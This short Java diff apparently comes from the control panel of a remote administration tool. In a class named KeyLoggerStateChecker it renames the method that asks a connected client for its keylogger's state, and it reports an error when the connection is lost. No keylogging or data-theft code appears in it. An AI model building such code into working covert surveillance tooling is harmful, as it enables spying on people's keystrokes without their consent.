@@ -19,7 +19,7 @@ public class KeyLoggerStateChecker extends SwingWorker<Void, Void> {
     protected Void doInBackground() {
 
         try {
-            stateOfKeylogger= stream.sendAndReadJSONX(KeyloggerEvents.STATE);
+            stateOfKeylogger = stream.sendAndReadAction(KeyloggerEvents.STATE);
         } catch (IOException ex) {
             new ClientErrorHandler("Unable to get keylogger options, connection lost with client"
                     ,stream.getClientSocket());
